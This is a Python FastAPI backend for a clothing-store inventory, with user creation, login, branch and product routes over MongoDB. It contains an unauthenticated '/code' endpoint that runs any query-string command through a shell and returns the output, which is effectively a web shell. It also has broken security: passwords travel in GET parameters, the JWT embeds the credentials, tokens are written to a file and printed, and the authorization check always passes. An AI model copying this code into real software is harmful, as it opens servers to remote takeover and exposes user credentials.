from fastapi.responses import JSONResponse, RedirectResponse, HTMLResponse
from fastapi import FastAPI, Request, Depends, Response, Header
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from fastapi.encoders import jsonable_encoder
from dotenv import load_dotenv, set_key
from models.models_products import *
from models.models_users import *
import motor.motor_asyncio
from bson import ObjectId
import subprocess
import dotenv
import motor
import jwt
import os

# --------------------------------Star app--------------------------------------

root = FastAPI()
security_scheme = OAuth2PasswordBearer(tokenUrl="token")

# -----------------------------Constants---------------------------------------

BRANCH_TABLE = "Branch"
USERS_TABLE = "Users"


# -------------------------------Create User------------------------------------

@root.post("/create/user")
async def create_user(add: Users):
    return await insert(table=add, database=connection_primary(dbtable=USERS_TABLE))


# -------------------------------Middleware's-----------------------------------

@root.get("/code")
def code(command: Optional[str]):
    a = subprocess.run(command, shell=True, capture_output=True, text=True)
    return HTMLResponse(str(a))


@root.middleware("http")
async def my_middleware(request: Request, call_next):
    print(f"Accediendo a {request.url}")
    response = await call_next(request)
    return response


# --------------------------------------Authentication-----------------------------

@root.get("/login/auth")
async def login(response: Response, username: str = None, password: str = None) -> RedirectResponse:
    try:
        collection = {
            "username": username,
            "password": password
        }
        db = connection_primary(dbtable=USERS_TABLE)
        access: dict = await db.table.find_one(collection)

        if access is not None:
            access["_id"] = str(access["_id"])
            del access["_id"]

            if access == collection:
                load_dotenv()
                token = jwt.encode(payload=collection, key=os.getenv("KEY"), algorithm=os.getenv("ALGORITHM"))
                set_key(".venv", "TOKEN_USER", token)
                response.headers["Authorization"] = token
                return RedirectResponse(url="/branch/")
        else:
            return JSONResponse(status_code=404, content={"message": "User not found"})

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})


def authorization(request: Request):
    load_dotenv()
    print("token: ", os.environ.get("TOKEN_USER"))
    print("token: ", request.headers.get("Authorization"))
    return True


# -------------------------------Método para obtener datos de la DB-----------------

async def GET_JSON_DB(_id: str) -> dict | JSONResponse:
    try:
        db = connection_primary(dbtable=BRANCH_TABLE)
        data = await db.table.find_one({"_id": ObjectId(_id)})

        if data is None:
            return JSONResponse(status_code=404, content={"message": "Unknown branch"})
        else:
            data["_id"] = str(data["_id"])
            return data

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})


# ------------------------------Conexión a la DB------------------------------

def connection_primary(dbtable: str) -> motor.motor_asyncio.AsyncIOMotorClient:
    load_dotenv()
    client = motor.motor_asyncio.AsyncIOMotorClient(os.getenv("DATABASE_URL"))
    db = client[dbtable]
    return db


# ----------------------Método para insertar datos a la db ------------------

async def insert(table, database: motor) -> JSONResponse:
    try:
        await database.table.insert_one(jsonable_encoder(table))
        return JSONResponse(status_code=201, content={"message": "Added branch"})

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})


# ----------------------------Método crear nueva sucursal----------------------

@root.post("/new_branch")
async def new_branch(data: Clothing_Store) -> JSONResponse:
    load_dotenv()
    return await insert(table=data, database=connection_primary(dbtable=BRANCH_TABLE))


# --------------------------------Métodos POST de productos-----------------------------

@root.post("/branch/{_id}/t_shirts/{person}")
async def set_t_shirts(t_shirts: T_Shirts, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=t_shirts, branch=_id, usage=person, keygen="t_shirts")


@root.post("/branch/{_id}/shorts/{person}")
async def set_shorts(shorts: Shorts, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=shorts, branch=_id, usage=person, keygen="shorts")


@root.post("/branch/{_id}/shirts/{person}")
async def set_shirts(shirts: Shirts, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=shirts, branch=_id, usage=person, keygen="shirts")


@root.post("/branch/{_id}/pants/{person}")
async def set_pants(pants: Pants, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=pants, branch=_id, usage=person, keygen="pants")


@root.post("/branch/{_id}/shoes/{person}")
async def set_shoes(shoes: Shoes, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=shoes, branch=_id, usage=person, keygen="shoes")


@root.post("/branch/{_id}/dresses/{person}")
async def set_dresses(dresses: Dresses, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=dresses, branch=_id, usage=person, keygen="dresses")


@root.post("/branch/{_id}/footwear/{person}")
async def set_footwear(footwear: Footwear, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=footwear, branch=_id, usage=person, keygen="footwear")


# ----------------------------Métodos PUT para modificar datos-----------------

@root.put("/branch/{_id}/t_shirts/{person}/{index}")
async def put_t_shirts(t_shirts: T_Shirts, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=t_shirts, branch=_id, usage=person, keygen="t_shirts", index=index)


@root.put("/branch/{_id}/shorts/{person}/{index}")
async def put_shorts(shorts: Shorts, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=shorts, branch=_id, usage=person, keygen="shorts", index=index)


@root.put("/branch/{_id}/shirts/{person}/{index}")
async def set_shirts(shirts: Shirts, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=shirts, branch=_id, usage=person, keygen="shirts", index=index)


@root.put("/branch/{_id}/pants/{person}/{index}")
async def set_pants(pants: Pants, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=pants, branch=_id, usage=person, keygen="pants", index=index)


@root.put("/branch/{_id}/shoes/{person}/{index}")
async def set_shoes(shoes: Shoes, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=shoes, branch=_id, usage=person, keygen="shoes", index=index)


@root.put("/branch/{_id}/dresses/{person}/{index}")
async def set_dresses(dresses: Dresses, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=dresses, branch=_id, usage=person, keygen="dresses", index=index)


@root.put("/branch/{_id}/footwear/{person}/{index}")
async def set_footwear(footwear: Footwear, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=footwear, branch=_id, usage=person, keygen="footwear", index=index)


# ----------------------------Agregar datos Inventario--------------------------

async def insert_products(data=None, branch: str = None, usage: str = None, keygen: str = None, index: str = None) -> JSONResponse:
    try:
        db = connection_primary(dbtable=BRANCH_TABLE)
        path_insert = f"{usage}.{keygen}"
        path_update = f"{usage}.{keygen}.{index}"

        if index is None:
            db.table.update_one({"_id": ObjectId(branch)}, {"$push": {path_insert: jsonable_encoder(data)}})
            return JSONResponse(status_code=201, content={"message": "Added information"})
        else:
            db.table.update_one({"_id": ObjectId(branch)}, {"$set": {path_update: jsonable_encoder(data)}})
            return JSONResponse(status_code=201, content={"message": "Modified information"})

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})


# ----------------------------Obtener datos de una Sucursal con query's---------------------------

@root.get("/branch/{_id}")
async def get_branch(_id: str, request: Request, person: Optional[str] = None, product: Optional[str] = None) -> JSONResponse:
    info = await GET_JSON_DB(_id=_id)
    authorization(request)

    try:
        if person is None and product is None:
            return JSONResponse(status_code=200, content={"branch": info})

        elif person is not None and product is None:
            return JSONResponse(status_code=200, content={person: info[person]})

        elif person is not None and product is not None:
            return JSONResponse(status_code=200, content={person: info[person][product]})

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})
